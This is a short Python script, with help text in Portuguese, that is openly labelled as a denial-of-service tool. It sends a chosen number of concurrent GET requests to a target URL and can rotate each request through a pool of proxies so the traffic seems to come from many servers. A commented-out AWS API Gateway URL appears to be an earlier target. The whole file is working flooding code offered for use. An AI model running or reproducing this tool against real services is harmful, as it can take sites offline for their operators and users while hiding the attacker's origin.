import aiohttp
import asyncio
from itertools import cycle
from proxies import proxie_list
import argparse

proxies = proxie_list.proxies
proxy_pool = cycle(proxies)

parser = argparse.ArgumentParser(description="Enviar quantidade massiva de requests")
parser.add_argument('-u', '--url', type=str, required=True, help="URL do DOS (ex: "
                                                                 "https://www.didi50.com/dos)")
parser.add_argument('-q', '--qtd_requests', type=int, required=True, help="Quantidade de "
                                                                          "requests enviadas (ex: 1000, 50000. OBS: "
                                                                          "Evite numeros estratosféricos)")

parser.add_argument('-p', '--proxies', action="store_true", help="Ativa o uso de proxies por request (isso faz com "
                                                                 "que cada request seja feita de um server diferente,"
                                                                 " porem existem muito mais chance de falhar a "
                                                                 "request)")

args = parser.parse_args()
parametro_u = args.url
parametro_q = args.qtd_requests
proxy_mode = args.proxies


async def fetch(session, url_test, proxy):
    try:
        if proxy_mode:
            async with session.get(url=url_test, proxy=proxy) as response:
                print(f"Requisição com proxy {proxy}, na URL: {url_test}: {response.status}")
        else:
            async with session.get(url=url_test) as response:
                print(f"Requisição usando IP local, na URL: {url_test}: {response.status}")
    except Exception as e:
        print(f"Erro com proxy {proxy}: {e}")


async def fetch_all(url_test, num):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(num):
            proxy = next(proxy_pool)
            tasks.append(fetch(session=session, url_test=url_test, proxy=proxy))
        await asyncio.gather(*tasks)


# url = " https://yqs4163l86.execute-api.sa-east-1.amazonaws.com/api/health"
url = parametro_u
# num_requests = 100000
num_requests = parametro_q
asyncio.run(fetch_all(url, num_requests))
